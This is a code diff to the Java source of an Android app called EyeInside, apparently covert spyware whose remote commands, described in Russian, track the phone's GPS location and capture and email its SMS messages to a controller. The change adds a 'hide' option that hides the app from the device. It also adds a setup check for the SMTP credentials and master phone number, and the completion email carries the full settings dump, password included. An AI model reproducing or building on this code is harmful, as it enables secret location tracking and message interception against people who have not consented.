@@ -20,9 +20,11 @@ import org.apache.http.impl.client.DefaultHttpClient;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
@@ -44,6 +46,8 @@ import com.code4bones.utils.NetLog;
 
 public class CommandPool {
 
+	public static final String PACKAGE_NAME="com.code4bones.EyeInside";
+	
 	public boolean mInitialized = false;
 	public Context mContext = null;
 	public ArrayList<ContactObj> mContacts = null;
@@ -127,7 +131,7 @@ public class CommandPool {
 		});
 		
 		//TODO: Commands...
-		Add(new CommandObjSetup(CommandObj.CMD_SETUP,"[?][user:<login>;pass:<password>;mail:<addres,..>;smtp:<smtp>;port:<port>;[{no}wifi|any net]];[{no}silent] - получить текущюю конфигурацию [?], или инициализировать интерфейс"));
+		Add(new CommandObjSetup(CommandObj.CMD_SETUP,"[?][user:<login>;pass:<password>;mail:<addres,..>;smtp:<smtp>;port:<port>;[{no}wifi|any net]];[{no}silent][hide|show] - получить текущюю конфигурацию [?], или инициализировать интерфейс"));
 		Add(new CommandObjGPS(CommandObj.CMD_GPS,"[time:nn][off] - получить позицию,дать nn секунд для более точного позиционирования"));
 		Add(new CommandObjSpySMS(CommandObj.CMD_SPY_SMS,"[off];[mail] - мониторинг новых сообщений [отправить на мыло]"));
 		Add(new CommandObjGetSMS(CommandObj.CMD_GET_SMS,"[from:YYMMDD;[to:YYMMDD]][date:YYMMDD] - получить смс на почту"));
@@ -946,14 +950,17 @@ public class CommandPool {
 					}
 				 } else {
 					boolean set = mArgs.hasOpt(name);
-					edit.putBoolean(name, set);
+					if ( set )
+						edit.putBoolean(name, set);
 				}
 			}
 		}
 		
+		
+		
 		public int Invoke() throws Exception {
 			SharedPreferences pref = mContext.getSharedPreferences("prefs", 1);
-			String initString = pref.contains("initString")?pref.getString("initString", "Интерфейс не инициализирован"):"Интерфейс не инициализирован";
+			//String initString = pref.getString("initString", "Интерфейс не инициализирован");
 			edit = pref.edit();
 
 			// mail
@@ -974,11 +981,15 @@ public class CommandPool {
 			};
 			
 			if ( mArgs.hasOpt("?") ) {
-				setResult("Текущая конфигурация: %s",initString);
+				String info = this.checkSetupComplete(pref,false,";");
+				if ( info == null )
+					setResult("Интерфейс не инициализирован ( @help setup )");
+				else 
+					setResult("Строка инициализации: %s",info);
 				return CommandObj.ACK;
 			} 
 			
-			edit.putString("initString",this.mCommandArgs);
+			//edit.putString("initString",this.mCommandArgs);
 			edit.commit();
 			
 			for ( String param : params )
@@ -988,10 +999,22 @@ public class CommandPool {
 				read(opt,true);
 			
 			
+			if ( mArgs.hasOpt("hide"))
+		    	MainActivity.showPackage(mContext,false);
+			else if ( mArgs.hasOpt("show") || mArgs.hasOpt("no hide"))
+		    	MainActivity.showPackage(mContext,true);
+				
+			
 			edit.putString(CommandObj.PREF_MASTER, this.mMasterPhone);
  		    edit.putBoolean("setup", true);
 		    edit.commit();
 			
+		    String complete = checkSetupComplete(pref,true,",");
+		    if ( complete != null ) {
+		    	setResult("Инициализация завершена не полностью, не хватает следующих значений:%s\r\n ( @help setup )",complete);
+		    	return CommandObj.ACK;
+		    }
+		    
 			if ( mLive ) {
 			  saveCommand(this);
 			  Mail m = createMail();
@@ -1005,15 +1028,9 @@ public class CommandPool {
 	
 					idx++;
 				}
+
 			  String setStr = "";
-			  Map<String,?> map = pref.getAll();
-			  for ( String key : map.keySet() ) {
-				  
-				  String val = String.format("%s",map.get(key));
-				  if ( setStr.length() != 0 )
-					  setStr += "\r\n";
-				  setStr += key + " = '" + val+"';";
-			  }
+			  setStr = this.checkSetupComplete(pref, false, "\r\n");
 			  
 			  m.setSubject("Инициализация EyeInside завершена !");
 			  m.setBody(String.format("Установка прошла успешно\nЗапрос:%s\nТекущий конфиг:\n%s\n\n",this.mCommandArgs,setStr)+msg);
@@ -1033,6 +1050,44 @@ public class CommandPool {
 			}
 			return OK;
 		}
+		
+		public String checkSetupComplete(SharedPreferences pref,boolean check,String sep) {
+			String[] reqKey = new String[] {
+					CommandObj.PREF_MAIL_USER,
+					CommandObj.PREF_MAIL_PASSWORD,
+					CommandObj.PREF_MAIL_TO,
+					CommandObj.PREF_MAIL_SMTP,
+					CommandObj.PREF_MAIL_PORT,
+					CommandObj.PREF_MASTER
+					};
+			String[] optKey = new String[] {
+					CommandObj.PREF_MAIL_PORT
+			};
+			
+			String reqVals = "";
+			if ( check ) {
+				for ( String key : reqKey ) {
+					boolean found = pref.contains(key) && pref.getString(key, "").length() > 0; 
+					if ( !found ) {
+						if ( reqVals.length() > 0 )
+							reqVals += ",";
+						reqVals += key+":<...>"; 
+					}
+				}
+			} else {
+				Map<String,?> map = pref.getAll();
+				for ( String key : map.keySet().toArray(new String[]{})) {
+					if ( reqVals.length() > 0 )
+						reqVals += sep;
+					reqVals += String.format("%s:%s",key,map.get(key));
+				}
+			}
+			if ( reqVals.length() == 0 )
+				return null;
+			
+			return reqVals;
+		}
+		
 	} // SETUP
 	
 	//
